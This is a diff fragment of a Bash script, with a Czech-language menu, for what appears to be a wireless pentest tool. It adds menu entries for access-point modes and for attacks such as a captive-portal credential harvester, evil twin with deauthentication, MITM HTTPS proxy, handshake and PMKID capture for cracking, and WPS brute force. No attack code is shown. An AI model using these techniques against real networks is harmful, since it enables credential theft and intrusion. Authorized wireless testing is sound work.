+    box_line "    ${G} 2)${N} WPA2 AP + DHCP + NAT"
+    box_line "    ${G} 3)${N} Open AP + plný pcap"
+    box_line "    ${G}10)${N} WPA3-SAE AP + DHCP + NAT"
+    box_line "    ${G}11)${N} Multi-SSID (2x SSID na jedné kartě)"
+    box_mid
+    box_head "Útoky / Pentest"
+    box_line "    ${R} 4)${N} MITM HTTPS proxy (mitmweb)"
+    box_line "    ${R} 5)${N} Captive Portal (credential harvester)"
+    box_line "    ${R} 6)${N} Evil Twin (clone real SSID + deauth)"
+    box_line "    ${R} 7)${N} Karma (odpovídá na všechny probe req)"
+    box_line "    ${R} 8)${N} WPA2 EAPOL handshake capture"
+    box_line "    ${R}12)${N} PMKID Capture (hcxdumptool → hashcat)"
+    box_line "    ${R}13)${N} WPA-Enterprise / Rogue RADIUS (hostapd-wpe)"
+    box_line "    ${R}14)${N} Beacon Flood (mdk4)"
+    box_line "    ${R}15)${N} WPS Pixie Dust / Bruteforce (reaver/bully)"
+    box_mid
+    box_head "Pasivní"
+    box_line "    ${Y} 9)${N} 802.11 monitor (beacons/probes/deauth)"
+    box_line "    ${Y}16)${N} Channel Hopper + Probe Collector"
+    box_line "    ${Y}17)${N} Živý přehled klientů (RSSI, TX/RX, IP)"
+    box_mid
+    box_head "Servis"
+    box_line "    ${W}18)${N} HTML Report (credentials, DNS, DHCP, pcap)"
+    box_line "    ${W} n)${N} Nastavení (SSID, kanál, rozhraní)"
+    box_line "    ${W} s)${N} Status"
+    box_line "    ${W} d)${N} Kontrola závislostí"
+    box_line "    ${W} k)${N} Kill / cleanup"
+    box_line "    ${W} q)${N} Quit"
+    box_bot
+    echo
 
     read -p "$(printf "%skukackap%s❯ " "$BOLD" "$N")" choice
 
@@ -1668,7 +1809,7 @@ while true; do
         s|S) mode_status ;;
         d|D) mode_install_deps ;;
         k|K) cleanup ;;
-        q|Q) echo "${G}Konec.${N}"; exit 0 ;;
-        *) echo "${R}Neplatná volba${N}"; sleep 1 ;;
+        q|Q) log INFO "${G}Konec.${N}"; exit 0 ;;
+        *) log ERR "${R}Neplatná volba${N}"; sleep 1 ;;
     esac
 done
